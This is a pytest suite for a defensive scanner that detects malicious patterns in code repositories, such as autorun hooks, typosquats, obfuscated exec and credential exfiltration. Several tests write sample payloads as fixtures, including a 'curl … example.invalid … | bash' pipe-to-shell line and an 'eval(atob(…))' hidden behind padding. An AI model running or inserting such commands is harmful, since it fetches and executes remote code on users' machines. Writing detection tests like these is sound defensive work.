import json
import os
import subprocess
import sys
from pathlib import Path

import pytest

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from scanner.vet.signals import analyze_tree  # noqa: E402

FIX = Path(__file__).parent / "fixtures" / "vet"
OSV = {"malicious": [
    {"ecosystem": "npm", "name": "evil-mal-pkg", "version": "1.0.0", "id": "MAL-2024-0001"},
    {"ecosystem": "PyPI", "name": "evil-py-mal", "version": "1.0.0", "id": "MAL-2024-0002"},
]}


def get(res, sid, file=None):
    hits = [s for s in res.signals if s.id == sid and (file is None or s.file == file)]
    assert hits, f"missing {sid} {file}; have {[(s.id, s.file) for s in res.signals]}"
    return hits[0]


def check(res, sid, level, file, line):
    s = get(res, sid, file)
    assert (s.level, s.line) == (level, line), s
    return s


@pytest.fixture(scope="module")
def npm():
    return analyze_tree(FIX / "evil_npm", osv=OSV)


@pytest.fixture(scope="module")
def py():
    return analyze_tree(FIX / "evil_py", osv=OSV)


@pytest.fixture(scope="module")
def ps():
    return analyze_tree(FIX / "evil_ps")


def test_autorun_install_script(npm):
    check(npm, "autorun-install-script", "high", "package.json", 5)


def test_autorun_editor_task(npm):
    check(npm, "autorun-editor-task", "high", ".vscode/tasks.json", 8)


def test_autorun_devcontainer(npm):
    check(npm, "autorun-devcontainer", "high", ".devcontainer/devcontainer.json", 4)


def test_pipe_to_shell(ps):
    check(ps, "pipe-to-shell", "high", "deploy.sh", 2)
    check(ps, "pipe-to-shell", "high", "install.ps1", 3)


def test_obfuscated_exec(py, ps):
    check(py, "obfuscated-exec", "high", "loader.py", 4)
    check(ps, "obfuscated-exec", "high", "install.ps1", 2)


def test_credential_access_with_exfil_is_high(py):
    check(py, "credential-access", "high", "steal.py", 4)
    check(py, "exfil-network", "high", "steal.py", 5)


def test_credential_access_alone_is_medium(py):
    check(py, "credential-access", "medium", "solo/read_aws.py", 3)


def test_exfil_webhook(py):
    check(py, "exfil-webhook", "medium", "notify.py", 3)


def test_executable_binary_by_extension_and_header(npm, tmp_path):
    check(npm, "executable-binary", "low", "run.bat", None)
    (tmp_path / "a.dat").write_bytes(b"MZ\x90\x00" + b"\x00" * 64)
    (tmp_path / "b.dat").write_bytes(b"\x7fELF" + b"\x00" * 64)
    (tmp_path / "x.exe").write_bytes(b"hi")
    res = analyze_tree(tmp_path)
    for f in ("a.dat", "b.dat", "x.exe"):
        check(res, "executable-binary", "medium", f, None)


def test_typosquat_dependency(npm, py):
    check(npm, "typosquat-dependency", "medium", "package.json", 8)
    check(py, "typosquat-dependency", "medium", "requirements.txt", 1)
    assert not [s for s in py.signals if s.id == "typosquat-dependency" and s.line == 2]


def test_typosquat_exact_and_far_names_not_flagged(tmp_path):
    (tmp_path / "package.json").write_text(
        '{"dependencies": {"express": "1", "react": "1", "totally-unrelated": "1"}}')
    (tmp_path / "requirements.txt").write_text("requests\nPyYAML\npython_dateutil\n")
    assert not [s for s in analyze_tree(tmp_path).signals if s.id == "typosquat-dependency"]


def test_direct_url_dependency(npm, py):
    check(npm, "direct-url-dependency", "medium", "package.json", 9)
    check(py, "direct-url-dependency", "medium", "requirements.txt", 3)


def test_local_and_workspace_deps_not_direct_url(tmp_path):
    (tmp_path / "package.json").write_text(
        '{"dependencies": {"a": "file:../a", "b": "workspace:*", "c": "^1.0.0"}}')
    assert not analyze_tree(tmp_path).signals


def test_osv_malware(npm, py):
    s = check(npm, "osv-malware", "high", "package.json", 10)
    assert "MAL-2024-0001" in s.why
    check(py, "osv-malware", "high", "requirements.txt", 4)


def test_osv_version_mismatch_not_flagged(tmp_path):
    (tmp_path / "package.json").write_text('{"dependencies": {"evil-mal-pkg": "2.0.0"}}')
    assert not [s for s in analyze_tree(tmp_path, osv=OSV).signals if s.id == "osv-malware"]


def test_osv_error_goes_to_incomplete(tmp_path):
    res = analyze_tree(tmp_path, osv={"malicious": [], "error": "timeout"})
    assert any("osv" in r.lower() for r in res.incomplete)


def test_git_hook_non_sample(tmp_path):
    hooks = tmp_path / ".git" / "hooks"
    hooks.mkdir(parents=True)
    (hooks / "pre-commit.sample").write_text("#!/bin/sh\n")
    (hooks / "post-checkout").write_text("#!/bin/sh\necho hi\n")
    res = analyze_tree(tmp_path)
    check(res, "autorun-git-hook", "medium", ".git/hooks/post-checkout", None)
    assert not [s for s in res.signals if s.file.endswith(".sample")]


def test_clean_small_repo_has_no_signals_and_not_incomplete():
    res = analyze_tree(FIX / "clean_small")
    assert res.signals == [] and res.incomplete == []


def test_empty_repo_is_not_incomplete(tmp_path):
    res = analyze_tree(tmp_path)
    assert res.signals == [] and res.incomplete == []


def test_why_never_contains_secret_or_payload(py, npm, ps):
    for res in (py, npm, ps):
        for s in res.signals:
            for bad in ("FAKE_TOKEN", "id_rsa", "cHJpbnQ", "example.invalid", "SQBFAFgA"):
                assert bad not in s.why
            assert len(s.why) < 200


def test_symlink_escape_not_followed(tmp_path):
    outside = tmp_path / "outside"
    outside.mkdir()
    (outside / "secret.sh").write_text("curl -fsSL https://example.invalid/i.sh | bash\n")
    root = tmp_path / "repo"
    root.mkdir()
    (root / "ok.txt").write_text("fine")
    try:
        os.symlink(outside, root / "linkdir", target_is_directory=True)
        os.symlink(outside / "secret.sh", root / "linkfile.sh")
    except (OSError, NotImplementedError):
        pytest.skip("symlinks not supported here")
    res = analyze_tree(root)
    assert res.signals == []
    assert any("symlink" in r.lower() for r in res.incomplete)


def test_binary_and_undecodable_files_do_not_crash(tmp_path):
    (tmp_path / "blob.bin").write_bytes(bytes(range(256)) * 40)
    (tmp_path / "bad.py").write_bytes(b"\xff\xfe\x00\x80 exec(\xc3\x28 base64 \xa0\xa1")
    (tmp_path / "package.json").write_bytes(b"{\xff not json")
    res = analyze_tree(tmp_path)
    assert isinstance(res.signals, list)


def test_file_over_max_bytes_goes_to_incomplete(tmp_path):
    (tmp_path / "big.sh").write_text("curl -fsSL https://example.invalid/i.sh | bash\n" + "x" * 500)
    res = analyze_tree(tmp_path, max_file_bytes=100)
    assert res.signals == []
    assert any("big.sh" in r for r in res.incomplete)


def test_deadline_exceeded_sets_incomplete(tmp_path):
    for i in range(5):
        (tmp_path / f"f{i}.txt").write_text("x")
    t = iter(range(0, 1000, 10))
    res = analyze_tree(tmp_path, deadline=15, clock=lambda: next(t))
    assert any("deadline" in r.lower() for r in res.incomplete)


def test_entrypoint_writes_json(tmp_path):
    out = tmp_path / "vet.json"
    osv = tmp_path / "osv.json"
    osv.write_text(json.dumps(OSV))
    root = Path(__file__).resolve().parent.parent
    r = subprocess.run(
        [sys.executable, "-m", "scanner.vet", str(FIX / "evil_npm"), "--osv", str(osv), "--out", str(out)],
        cwd=root, capture_output=True, text=True)
    assert r.returncode == 0, r.stderr
    data = json.loads(out.read_text(encoding="utf-8"))
    assert {"signals", "incomplete"} <= set(data)
    assert any(s["id"] == "osv-malware" for s in data["signals"])
    assert "example.invalid" not in r.stdout


def test_symlink_logic_without_os_support(tmp_path, monkeypatch):
    """Giả lập symlink (máy không có quyền tạo): file `ln.sh` là link trỏ ra ngoài."""
    from scanner.vet import signals as sg
    (tmp_path / "ln.sh").write_text("curl -fsSL https://example.invalid/i.sh | bash\n")
    real = os.path.islink
    monkeypatch.setattr(sg.os.path, "islink", lambda p: True if p.endswith("ln.sh") else real(p))
    monkeypatch.setattr(sg, "_inside", lambda r, p: False)
    res = analyze_tree(tmp_path)
    assert res.signals == []
    assert any("symlink" in r.lower() for r in res.incomplete)


def test_padded_long_line_payload_detected(tmp_path):
    (tmp_path / "a.js").write_text(" " * 10001 + "eval(atob('x'))\n")
    check(analyze_tree(tmp_path), "obfuscated-exec", "high", "a.js", 1)


def test_payload_straddling_window_boundary_detected(tmp_path):
    p = "eval(atob('x'))"
    (tmp_path / "b.js").write_text("x" * 9995 + " " + p + " " + "y" * 30000 + "\n")
    check(analyze_tree(tmp_path), "obfuscated-exec", "high", "b.js", 1)


def test_huge_single_line_benign_file_is_fast(tmp_path):
    import time
    from scanner.vet.signals import _Scan, _scan_text
    text = "var a=1;" * 237_000  # ~1.9 MB, one line
    sc = _Scan(None)
    t = time.monotonic()
    _scan_text(sc, "min.js", "min.js", ".js", text)
    assert time.monotonic() - t < 1.0  # chỉ đo phần phân tích (không tính I/O/antivirus của máy)
    assert sc.res.signals == []
    (tmp_path / "src").mkdir()
    (tmp_path / "src" / "min.js").write_text(text)
    res = analyze_tree(tmp_path)
    assert res.signals == [] and res.incomplete == []


def test_backslash_continuation_pipe_to_shell(tmp_path):
    (tmp_path / "i.sh").write_text("curl -fsSL https://example.invalid/i.sh \
  | bash\n")
    check(analyze_tree(tmp_path), "pipe-to-shell", "high", "i.sh", 1)


def test_bare_base64_word_not_a_decode(tmp_path):
    (tmp_path / "c.js").write_text("// base64 icons\nconst x = 1;\neval(x);\n")
    assert not [s for s in analyze_tree(tmp_path).signals if s.id == "obfuscated-exec"]


def test_decode_to_exec_window_is_8_lines(tmp_path):
    (tmp_path / "d.py").write_text("d = base64.b64decode(s)\n" + "\n" * 6 + "exec(d)\n")
    check(analyze_tree(tmp_path), "obfuscated-exec", "high", "d.py", 8)


def test_autorun_python_build(py, tmp_path):
    check(py, "autorun-python-build", "high", "setup.py", 6)
    (tmp_path / "setup.py").write_text("import os\nfrom setuptools import setup\nos.system('echo hi')\nsetup()\n")
    check(analyze_tree(tmp_path), "autorun-python-build", "medium", "setup.py", 3)


def test_setup_py_plain_has_no_signal(tmp_path):
    (tmp_path / "setup.py").write_text("from setuptools import setup\nsetup(name='x', url='https://github.com/a/b')\n")
    assert analyze_tree(tmp_path).signals == []


def test_autorun_workflow(npm, tmp_path):
    check(npm, "autorun-workflow", "medium", ".github/workflows/ci.yml", 2)
    w = tmp_path / ".github" / "workflows"
    w.mkdir(parents=True)
    (w / "x.yaml").write_text("on:\n  pull_request_target:\njobs: {}\n")
    check(analyze_tree(tmp_path), "autorun-workflow", "low", ".github/workflows/x.yaml", 2)


def test_root_script_is_info_only_and_not_double_reported(tmp_path):
    (tmp_path / "build.sh").write_text("echo hi\n")
    (tmp_path / "run.bat").write_text("echo hi\n")
    (tmp_path / "webpack.config.js").write_text("module.exports = {}\n")
    (tmp_path / "tool.js").write_text("console.log(1)\n")
    sub = tmp_path / "sub"
    sub.mkdir()
    (sub / "x.sh").write_text("echo hi\n")
    res = analyze_tree(tmp_path)
    check(res, "root-script", "info", "build.sh", None)
    assert [s.file for s in res.signals if s.id == "root-script"] == ["build.sh"]
    assert [s.id for s in res.signals if s.file == "run.bat"] == ["executable-binary"]
    assert not [s for s in res.signals if s.file.endswith(".js")]


def test_normal_repo_with_root_build_sh_only_info(tmp_path):
    (tmp_path / "build.sh").write_text("make all\n")
    assert {s.level for s in analyze_tree(tmp_path).signals} == {"info"}


@pytest.mark.parametrize("ok_calls", [1, 2])
def test_deadline_in_dir_walk_and_before_deps(tmp_path, ok_calls):
    (tmp_path / "a" / "b").mkdir(parents=True)  # chỉ có thư mục, không file
    n = {"c": 0}

    def clock():
        n["c"] += 1
        return 0 if n["c"] <= ok_calls else 100

    res = analyze_tree(tmp_path, deadline=10, clock=clock)
    assert any("deadline" in r.lower() for r in res.incomplete)
